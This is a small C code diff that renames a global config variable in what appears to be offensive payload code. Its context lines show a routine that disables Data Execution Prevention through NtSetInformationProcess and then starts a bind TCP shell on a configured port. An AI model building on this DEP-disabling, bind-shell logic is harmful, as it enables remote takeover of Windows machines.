@@ -7,7 +7,7 @@ void start_bindtcp(int port);
 
 typedef NTSTATUS(WINAPI* pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
 
-CONFIG conf;
+CONFIG g_conf;
 
 BOOL disable_dep() {
     HMODULE ntdll_handle;
@@ -27,11 +27,11 @@ BOOL disable_dep() {
 }
 
 void start_executable() {
-    if (conf.port == NULL)
+    if (g_conf.port == NULL)
     {
         return;
     }
     disable_dep();
-    start_bindtcp(conf.port);
+    start_bindtcp(g_conf.port);
 
 }
